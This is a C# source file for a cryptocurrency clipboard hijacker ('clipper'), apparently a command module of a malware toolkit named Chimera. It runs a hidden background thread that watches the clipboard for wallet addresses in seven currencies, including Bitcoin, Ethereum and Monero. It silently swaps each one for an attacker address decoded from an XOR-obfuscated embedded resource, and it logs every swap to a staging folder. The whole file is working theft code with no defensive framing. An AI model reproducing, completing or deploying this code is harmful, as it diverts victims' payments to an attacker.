using System;
using System.IO;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Chimera.Commands
{
    // clipper start  — begin clipboard monitoring in background thread
    // clipper stop   — stop monitoring
    // clipper status — show running state and loaded swap addresses
    public static class Clipper
    {
        // ── Regex patterns ────────────────────────────────────────────────────────
        private static readonly Regex RxBtcLegacy = new Regex(
            @"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", RegexOptions.Compiled);
        private static readonly Regex RxBtcBech32 = new Regex(
            @"^bc1[ac-hj-np-z02-9]{6,87}$", RegexOptions.Compiled);
        private static readonly Regex RxEth = new Regex(
            @"^0x[a-fA-F0-9]{40}$", RegexOptions.Compiled);
        private static readonly Regex RxXmr = new Regex(
            @"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", RegexOptions.Compiled);
        private static readonly Regex RxSol = new Regex(
            @"^[1-9A-HJ-NP-Za-km-z]{43,44}$", RegexOptions.Compiled);
        private static readonly Regex RxLtc = new Regex(
            @"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", RegexOptions.Compiled);
        private static readonly Regex RxTrx = new Regex(
            @"^T[A-Za-z1-9]{33}$", RegexOptions.Compiled);
        private static readonly Regex RxXrp = new Regex(
            @"^r[a-zA-Z0-9]{24,34}$", RegexOptions.Compiled);

        // ── State ─────────────────────────────────────────────────────────────────
        private static Thread  _thread    = null;
        private static bool    _running   = false;
        private static string  _addrBtc   = null;
        private static string  _addrEth   = null;  // covers ETH + BNB (same 0x format)
        private static string  _addrXmr   = null;
        private static string  _addrSol   = null;
        private static string  _addrLtc   = null;
        private static string  _addrTrx   = null;
        private static string  _addrXrp   = null;
        private static int     _swapCount = 0;
        private static readonly object _lock = new object();

        // ── Entry point ───────────────────────────────────────────────────────────
        public static string Execute(string param)
        {
            string p = (param ?? "").Trim().ToLower();
            switch (p)
            {
                case "start":  return Start();
                case "stop":   return Stop();
                case "status": return Status();
                default:       return "[error] Usage: clipper start | stop | status";
            }
        }

        // ── Start ─────────────────────────────────────────────────────────────────
        private static string Start()
        {
            lock (_lock)
            {
                if (_running) return "[-] Clipper already running.";
                string loadErr = LoadAddresses();
                if (loadErr != null) return loadErr;
                _running   = true;
                _swapCount = 0;
                _thread    = new Thread(MonitorLoop) { IsBackground = true };
                _thread.SetApartmentState(ApartmentState.STA);
                _thread.Start();
            }
            return "[+] Clipper started.\n" +
                   "    BTC     : " + (_addrBtc ?? "(none)") + "\n" +
                   "    ETH/BNB : " + (_addrEth ?? "(none)") + "\n" +
                   "    XMR     : " + (_addrXmr ?? "(none)") + "\n" +
                   "    SOL     : " + (_addrSol ?? "(none)") + "\n" +
                   "    LTC     : " + (_addrLtc ?? "(none)") + "\n" +
                   "    TRX     : " + (_addrTrx ?? "(none)") + "\n" +
                   "    XRP     : " + (_addrXrp ?? "(none)");
        }

        // ── Stop ──────────────────────────────────────────────────────────────────
        private static string Stop()
        {
            lock (_lock)
            {
                if (!_running) return "[-] Clipper not running.";
                _running = false;
            }
            if (_thread != null) _thread.Join(1500);
            return "[+] Clipper stopped. Total swaps performed: " + _swapCount;
        }

        // ── Status ────────────────────────────────────────────────────────────────
        private static string Status()
        {
            return string.Format(
                "Clipper: {0} | Swaps: {1}\n" +
                "  BTC     = {2}\n  ETH/BNB = {3}\n  XMR     = {4}\n" +
                "  SOL     = {5}\n  LTC     = {6}\n  TRX     = {7}\n  XRP     = {8}",
                _running ? "RUNNING" : "STOPPED", _swapCount,
                _addrBtc ?? "?", _addrEth ?? "?", _addrXmr ?? "?",
                _addrSol ?? "?", _addrLtc ?? "?", _addrTrx ?? "?", _addrXrp ?? "?");
        }

        // ── Background monitor ────────────────────────────────────────────────────
        private static void MonitorLoop()
        {
            string lastSeen = null;
            while (true)
            {
                lock (_lock) { if (!_running) break; }
                try
                {
                    string text = Clipboard.GetText();
                    if (!string.IsNullOrEmpty(text) && text != lastSeen)
                    {
                        string swap = FindSwap(text.Trim());
                        if (swap != null)
                        {
                            Clipboard.SetText(swap);
                            lastSeen = swap;
                            Interlocked.Increment(ref _swapCount);
                            try
                            {
                                string log = DateTime.UtcNow.ToString("u") +
                                             " | ORIG: " + text.Trim() +
                                             " | SWAP: " + swap + "\n";
                                File.AppendAllText(
                                    Path.Combine(Staging.Dir, "clipper.log"), log);
                            }
                            catch { }
                        }
                        else { lastSeen = text; }
                    }
                }
                catch { /* clipboard locked */ }
                Thread.Sleep(500);
            }
        }

        // ── Pattern matching — SOL/TRX/XRP first (most specific patterns) ─────────
        private static string FindSwap(string text)
        {
            if (_addrTrx != null && RxTrx.IsMatch(text)) return _addrTrx;
            if (_addrXrp != null && RxXrp.IsMatch(text)) return _addrXrp;
            if (_addrSol != null && RxSol.IsMatch(text)) return _addrSol;
            if (_addrBtc != null && RxBtcBech32.IsMatch(text))   return _addrBtc;
            if (_addrBtc != null && RxBtcLegacy.IsMatch(text))   return _addrBtc;
            if (_addrEth != null && RxEth.IsMatch(text)) return _addrEth;
            if (_addrXmr != null && RxXmr.IsMatch(text)) return _addrXmr;
            if (_addrLtc != null && RxLtc.IsMatch(text)) return _addrLtc;
            return null;
        }

        // ── Load addresses from embedded crypto_map_enc resource ──────────────────
        // XOR key 0x41, JSON format:
        // {"btc":"...","eth":"...","xmr":"...","sol":"...","ltc":"...","trx":"...","xrp":"..."}
        private static string LoadAddresses()
        {
            try
            {
                var asm    = Assembly.GetExecutingAssembly();
                var stream = asm.GetManifestResourceStream("crypto_map_enc");
                if (stream == null)
                    return "[error] Resource 'crypto_map_enc' not found. " +
                           "Bundle with /res:crypto_map_enc,crypto_map_enc at build time.";

                byte[] enc = new byte[stream.Length];
                stream.Read(enc, 0, enc.Length);
                stream.Close();
                for (int i = 0; i < enc.Length; i++) enc[i] ^= 0x41;
                string json = System.Text.Encoding.UTF8.GetString(enc);

                _addrBtc = ExtractJsonString(json, "btc");
                _addrEth = ExtractJsonString(json, "eth");
                _addrXmr = ExtractJsonString(json, "xmr");
                _addrSol = ExtractJsonString(json, "sol");
                _addrLtc = ExtractJsonString(json, "ltc");
                _addrTrx = ExtractJsonString(json, "trx");
                _addrXrp = ExtractJsonString(json, "xrp");

                if (_addrBtc == null && _addrEth == null && _addrXmr == null &&
                    _addrSol == null && _addrLtc == null && _addrTrx == null && _addrXrp == null)
                    return "[error] crypto_map_enc decoded but no addresses found. " +
                           "Check JSON format.";
                return null;
            }
            catch (Exception ex) { return "[error] LoadAddresses: " + ex.Message; }
        }

        private static string ExtractJsonString(string json, string key)
        {
            string search = "\"" + key + "\":\"";
            int idx = json.IndexOf(search, StringComparison.OrdinalIgnoreCase);
            if (idx == -1) return null;
            int start = idx + search.Length;
            int end   = json.IndexOf('"', start);
            if (end == -1) return null;
            string val = json.Substring(start, end - start).Trim();
            return val.Length > 0 ? val : null;
        }
    }
}
